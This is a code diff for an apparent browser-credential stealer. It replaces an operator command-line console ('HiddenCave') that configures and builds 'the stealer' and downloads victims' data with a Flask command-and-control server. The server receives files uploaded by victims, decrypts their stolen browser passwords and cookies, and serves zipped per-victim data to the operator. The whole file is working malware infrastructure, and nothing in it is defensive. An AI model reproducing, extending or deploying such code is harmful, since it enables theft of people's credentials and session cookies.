@@ -1,215 +1,162 @@
-import cmd
-import os
-import json
-from utils.asciiart import banner
-from models.CORE import Core
+from flask import Flask, request, Response
+from models.victim import Victim
+from models.crypto import CryptoOps
 
 
-class HiddenCave(cmd.Cmd):
-    prompt = "$HiddenCave-> "
-    doc_header = "Use help <command> for more information."
-    core = Core()
+app = Flask(__name__)
 
-    def default(self, arg):
-        print("[-] Invalid command, use help for information.")
+crypt = CryptoOps()
 
-    def do_exit(self, arg):
-        "exit the CLI.\n"
-        exit(0)
 
-    def do_clear(self, arg):
-        "clear the stdout.\n"
-        if os.name == 'nt':
-            _ = os.system('cls')
-        else:
-            _ = os.system('clear')
+def SendAsChunks(buffer, ChunkSize):
+    """
+    Sends a big buffer chunk by chunk.
+    args:
+        @buffer (Any): buffer that will be sent.
+        @ChunkSize (int): the chunk size.
+    """
+    for i in range(0, len(buffer), ChunkSize):
+        yield buffer[i:i + ChunkSize]
 
-    def do_set(self, arg):
-        "set attributes\nusage: set <attribute> <value>\n"
-        args = arg.split(" ")
-        if len(args) != 2:
-            print("[*] Missing parameters.")
-        elif args[0].lower() == "ip":
-            if self.core.IsValidIpv4(args[1]) is False:
-                print("[-] Invalid IP address.")
-            self.core.ip = args[1]
-        elif args[0].lower() == "port":
-            if self.core.IsValidPort(args[1]) is False:
-                print("[-] Invalid port.")
-            self.core.port = args[1]
-        elif args[0].lower() == "key":
-            if args[1].lower() == "rand":
-                self.core.EncryptionKey = self.core.RandomString(32).encode("utf-8")
-                return
 
-            if len(args[1]) != 32:
-                print("[-] Invalid key length. Expected 32.")
-                return
+@app.route("/up", methods=["POST"])
+def up():
+    """
+    Route for uploading files, the file then will be handled by the Victim class.
+    """
+    CurrentVictim = Victim(request.remote_addr)
+    NameHeader = request.headers.get("name")
+    if NameHeader is None or len(request.data) == 0:
+        return '', 400
 
-            self.core.EncryptionKey = args[1].encode("utf-8")
-        elif args[0].lower() == "iv":
-            if args[1].lower() == "rand":
-                self.core.IV = self.core.RandomString(32).encode("utf-8")
-                return
+    FilePath = CurrentVictim.GetFileStoragePath(NameHeader)
 
-            if len(args[1]) != 32:
-                print("[-] Invalid IV length. Expected 12")
-                return
+    dataout = open(FilePath, 'wb')
+    dataout.write(request.data)
+    dataout.close()
 
-            self.core.IV = args[1].encode("utf-8")
+    return '', 200
 
-    def do_show(self, arg):
-        print(f"[+] IP: {self.core.ip}")
-        print(f"[+] Port: {self.core.port}")
-        print(f"[+] Encryption Key: {"NULL" if self.core.EncryptionKey is None else self.core.EncryptionKey.decode('utf-8')}")
-        print(f"[+] IV: {"NULL" if self.core.IV is None else self.core.IV.decode('utf-8')}")
 
-    def do_save(self, arg):
-        "save the current cryptographic settings.\nusage: save <filename>\n"
-        args = arg.split(".")
-        if args[-1] != "json":
-            print("[-] Invalid file name, The file must have the json file extention \".json\".")
-            return
+@app.route("/check", methods=["GET"])
+def check():
+    """
+    route to check the cryptographic parameters.
+    """
+    message = request.headers.get("cc")
+    message = crypt.DecryptBuffer(message)
+    if message == "Are you ready?":
+        response = crypt.EncryptBuffer("yes daddy.")
+        response = {"cc": response}
 
-        if self.core.ip is None or self.core.port is None or self.core.EncryptionKey is None or self.core.IV is None :
-            print("[-] Nothing to save.")
-            return
+        return "", 200, response
+    else:
+        return "", 400
 
-        if os.path.isfile(arg) is True:
-            IsTrue = self.core.GetUserInput("[!] File already exists. Do you want to overwrite the file? (Y/N): ", "Input must be either Y or N", 0, ["y", "n"], True)
-            if IsTrue == "n":
-                return
 
-        self.core.save(arg)
-        print("[+] Done.")
+@app.route("/GetAll", methods=["GET"])
+def GetAll():
+    """
+    route for getting all victims detals
 
-    def do_load(self, arg):
-        "load the cryptographic settings from a file.\nusage: load <filename>\n"
-        args = arg.split(".")
-        if args[-1] != "json":
-            print("[-] Invalid file name, the file must have the json file extention \".json\".")
-            return
+    return:
+        List[dict] = list of dicts each contains information about victim's info
+    """
+    data = Victim(None).AllVictims
+    data = crypt.EncryptBuffer(data)
+    return Response(data, mimetype="text/plain", status=200)
 
-        if self.core.ip is not None or self.core.port is not None or self.core.EncryptionKey is not None or self.core.IV is not None :
-            UserInput = self.core.GetUserInput("[!] The current settings will be overwritten, do you wanna continue? (Y/N): ", "Input must be either Y or N", 0, ["y", "n"], True)
-            if UserInput == "n":
-                return
 
-        if os.path.isfile(arg) is False:
-            print("[-] The file does not exist.")
-            return
+@app.route("/GetVictimData", methods=["GET"])
+def GetVictimData():
+    """
+    route to get a single victim browsers data.
 
-        self.core.load(arg)
-        print("[+] Done.")
+    return:
+        dict[list]: dict contains all browser data (passwords and cookies)
+    """
+    VictimIP = request.headers.get("TARGET")
+    if VictimIP is not None:
 
-    def do_check(self, arg):
-        "API and cryptographic parameters check command\n"
-        if self.core.ip is None:
-            print("[-] IP is missing.")
-            return
-        if self.core.port is None:
-            print("[-] Port is missing.")
-            return
-        if self.core.EncryptionKey is None:
-            print("[-] Encryption key is missing.")
-            return
-        if self.core.IV is None:
-            print("[-] IV is missing.")
-            return
+        def GetKey(browser):
+            KeyPath = CurrentVictim.GetFilePath(str(browser + 1), "KEY")
 
-        if self.core.IsUP() is True:
-            print("[+] All good.")
-            self.core.IsReady = True
-
-    def do_listv(self, arg):
-        "list the current victims.\n"
-        if self.core.IsReady is not True:
-            print("[-] You have to run and pass the check by running the check command.")
-            return
-
-        self.AllVictimsData = self.core.GetVictims()
-
-        if self.AllVictimsData is not None:
-            if len(self.AllVictimsData) == 0:
-                print("[+] No victims.")
-                return
-
-            for ip in self.AllVictimsData.keys():
-                TotalBrowsers = int(self.AllVictimsData[ip]["BrowserCount"])
-                print("#" * 35)
-                print(f"[+] Victim IP: {ip}")
-                print(f"[+] Total grabbed browsers: {TotalBrowsers}")
-
-                for i in range(0, TotalBrowsers):
-                    print(f"[+] Browser {i + 1}")
-
-                    extentions = self.AllVictimsData[ip]["browsers"][i]["extentions"]
-                    BrowserFiles = self.AllVictimsData[ip]["browsers"][i]["browserfiles"]
-
-                    print("    Browser files:")
-                    for file in BrowserFiles:
-                        print(f"\t- {file}")
-
-                    print("    Extentions:")
-                    for extention in extentions.keys():
-                        print(f"\t- {extention}")
-            print("#" * 35)
-        else:
-            print("[-] You should first run the command check to check the API status and cryptographic parameters.")
-
-    def do_grabdata(self, arg):
-        "grabdata a victim\'s browser data.\nusage: grabdata <victim's ip address>.\n"
-        if self.core.IsReady is not True:
-            print("[-] You have to run and pass the check by running the check command.")
-            return
-
-        if len(arg) == 0:
-            print("[-] Invalid input.")
-            return
-
-        data = self.core.GetVictimBrowsersData(arg)
-        if data is not None:
-            FileName = arg + ".json"
-            file = open(FileName, "w")
-            json.dump(data, file, indent=4)
+            file = open(KeyPath, "rb")
+            key = file.read()
             file.close()
-            print(f"[+] Done, data has been saved in {FileName}")
 
-    def do_grabraw(self, arg):
-        "grabd a victim\'s raw data.\nusage: grabraw <victim's ip address>.\n"
-        if self.core.IsReady is not True:
-            print("[-] You have to run and pass the check by running the check command.")
-            return
+            return key
 
-        if len(arg) == 0:
-            print("[-] Invalid input.")
-            return
+        def DecryptAndFormat(data, browser):
+            key = GetKey(browser)
 
-        data = self.core.GetVictimData(arg)
-        if data is not None:
-            FileName = arg + ".zip"
-            file = open(FileName, "wb")
-            file.write(data)
-            file.close()
-            print(f"[+] Done, data has been saved in {FileName}")
+            for i in range(len(data)):
+                NewData = []
+                DataLen = len(data[i])
+                for j in range(DataLen):
+                    if j != (DataLen - 1):
+                        NewData.append(data[i][j])
+                PlainTextValue = crypt.DecryptBrowserCipher(key, data[i][-1])
+                if PlainTextValue == b'':
+                    PlainTextValue = "EMPTY"
+                else:
+                    PlainTextValue = PlainTextValue.decode("utf-8")
+                NewData.append(PlainTextValue)
+                data[i] = NewData
 
-    def do_build(self, arg):
-        "build the stealer.\n"
-        if self.core.ip is None:
-            print("[-] IP is NULL, set it before you can build the stealer.")
-            return
-        if self.core.port is None:
-            print("[-] Port is NULL, set it before you can build the stealer.")
-            return
+        VictimIP = crypt.DecryptBuffer(VictimIP)
+        CurrentVictim = Victim(VictimIP)
 
-        self.core.BuildExe(self.core.ip, self.core.ip)
-        print("[+] Building is done, the executable is in payload/bin.")
+        if CurrentVictim.IsNew is True:
+            return 'The requested victim does not exist', 204
 
+        VictimData = CurrentVictim.GetVictimBrowserData()
+
+        passwords = VictimData["PASSWORDS"]
+        cookies = VictimData["COOKIES"]
+
+        for browser in range(CurrentVictim.CurrentVictim["BrowserCount"]):
+            data = passwords[browser]
+            DecryptAndFormat(data, browser)
+            passwords[browser] = data
+
+            data = cookies[browser]
+            DecryptAndFormat(data, browser)
+            cookies[browser] = data
+
+        VictimData = crypt.EncryptBuffer(VictimData)
+
+        return Response(SendAsChunks(VictimData, 102400), status=200, content_type='text/plain')
+
+    return 'sir t9awd', 400
+
+
+@app.route("/down", methods=["GET"])
+def down():
+    """
+    route for downloading all victims data
+
+    return:
+        bytes = encrypted zip file.
+    """
+    VictimIP = request.headers.get("TARGET")
+    if VictimIP is not None:
+        VictimIP = crypt.DecryptBuffer(VictimIP)
+        CurrentVictim = Victim(VictimIP)
+
+        if CurrentVictim.IsNew is True:
+            return 'The requested victim does not exist', 204
+
+        FileName = CurrentVictim.ZipVictimFolder()
+        file = open(FileName, "rb")
+        data = crypt.EncryptBuffer(file.read())
+        file.close()
+        CurrentVictim.RemoveVictimZip()
+
+        return Response(SendAsChunks(data, 102400), status=200, content_type='text/plain')
+
+    return 'sir t9awd', 400
 
 
 if __name__ == '__main__':
-    try:
-        print(banner)
-        HiddenCave().cmdloop()
-    except KeyboardInterrupt:
-        exit(0)
+    app.run(host="0.0.0.0", port=1133, debug=True)
